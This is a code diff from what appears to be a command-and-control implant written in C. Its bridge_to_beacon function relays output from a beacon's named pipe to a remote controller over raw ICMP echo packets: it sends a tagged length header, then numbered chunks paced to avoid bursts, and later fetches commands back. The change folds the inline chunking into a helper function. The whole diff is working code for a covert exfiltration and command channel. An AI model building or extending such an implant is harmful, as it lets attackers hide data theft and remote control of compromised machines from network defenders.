@@ -643,78 +643,9 @@ int bridge_to_beacon() {
             continue;
         }
 
-        // 2) First, send a “length” packet with seq = 0
-        //    (TAG_SIZE bytes of tag + 4 bytes of network‐order length)
-        uint32_t netlen = htonl(total_len);
-        char size_buf[TAG_SIZE + 4];
-        memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-        memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
-        // send exactly TAG_SIZE+4 bytes with sequence number = 0
-        printf("[+] SENDING SIZE_OF_PACKET\n");
-        send_icmp(s, &dest, size_buf, TAG_SIZE + sizeof(netlen), 0);
-
-        // slight pause so controller can read seq=0 before chunks arrive
-        Sleep(100);
-
-        // 3) Now break pipe_buffer[0..total_len-1] into multiple ICMP chunks
-        int max_data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
-        int offset = 0;
-        USHORT seq = 1;
-
-        while (offset < total_len) {
-            printf("[+] SENDING CHUNK TO CONTROLLER\n");
-
-            int chunk_data_len = total_len - offset;
-            if (chunk_data_len > max_data_per_chunk) {
-                chunk_data_len = max_data_per_chunk;
-            }
-
-            // build a single chunk: [TAG][ data[offset .. offset+chunk_data_len-1] ]
-            char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-            memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
-            memcpy(chunk_buf + TAG_SIZE, pipe_buffer + offset, chunk_data_len);
-            int chunk_payload_len = TAG_SIZE + chunk_data_len;
-
-            send_icmp(s, &dest, chunk_buf, chunk_payload_len, seq);
-
-            offset += chunk_data_len;
-            seq += 1;
-            Sleep(100);   // small gap so packets don’t burst
-        }
-
-        // // 2) Print exactly what came through the pipe.
-        // //    We use "%.*s" so that we print exactly 'beacon_output' bytes,
-        // //    even if the buffer contains binary data or no terminating '\0'.
-        // printf("[+] Read %u bytes from named pipe: \"", beacon_output);
-        // printf("%.*s", beacon_output, pipe_buffer);
-        // printf("\"\n");
-
-        // // 3) Package that pipe data into an ICMP payload for the controller.
-        // //    a) The first TAG_SIZE bytes must be our agreed‐upon tag (ICMP_TAG).
-        // //    b) After the tag, we copy up to (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes
-        // //       of actual beacon_output data.  Anything beyond that would overflow.
-        // int data_len = (int)beacon_output;
-        // if (data_len > ICMP_PAYLOAD_SIZE - TAG_SIZE) {
-        //     data_len = ICMP_PAYLOAD_SIZE - TAG_SIZE;
-        // }
-        // char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-        // memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
-        // memcpy(chunk_buf + TAG_SIZE, pipe_buffer, data_len);
-        // int chunk_payload_len = TAG_SIZE + data_len;
-
-        // // 4) Send a single ICMP Echo Request to the controller:
-        // //    - 's' is our raw socket.
-        // //    - '&dest' holds the controller’s IP address.
-        // //    - 'chunk_buf' is the full payload (TAG + data).
-        // //    - 'chunk_payload_len' is its actual length.
-        // //    - '1' is the ICMP sequence number for “data updates.”
-        // send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);
-
-        // // 5) Now ask the controller if it has queued any commands back to us.
-        // printf("[+] Getting data from controller\n");
+        send_icmp_fragments(s, &dest, pipe_buffer, total_len);
 
         printf("[+] Getting data from controller (possibly multi‐packet)\n");
-        //moving to chunk based
         uint32_t controller_len = 0;
 
         //uint32_t controller_len = 0;
